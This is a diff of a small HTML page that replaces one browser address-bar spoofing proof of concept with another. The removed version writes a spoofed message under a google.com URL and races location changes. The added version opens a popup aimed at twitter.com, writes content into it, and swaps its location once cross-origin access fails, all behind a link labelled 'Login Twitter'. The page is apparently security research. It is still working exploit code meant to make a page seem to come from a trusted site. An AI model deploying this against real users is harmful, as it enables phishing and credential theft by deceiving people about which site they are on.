@@ -1,31 +1,13 @@
-<head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
+<script>
+  function next() {
+         w.location.replace('http://wrong.host.badssl.com/');
+        }
 
-<body>
-    <a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
-</body>
-    
-    <script>
-    
-    let windowSpoof;
+  function f() {
+    w = window.open("javascript:document.write('spoof');location='http://twitter.com'","new","width=500 height=500");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
+</script>
 
-    function race() {
-      try {
-        windowSpoof.location.href !== 'about:blank';
-      }
-      catch (e) {
-        windowSpoof.location.href='https://www.google.com/csi';
-      }
-    }
-    
-    function startSpoof() {
-
-      windowSpoof = window.open("https://www.google.com:82","x");
-      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
-
-      setInterval('race()', 0);
-    
-    }
-   
+<a href="#" onclick="f()">Login Twitter</a>
     </script>
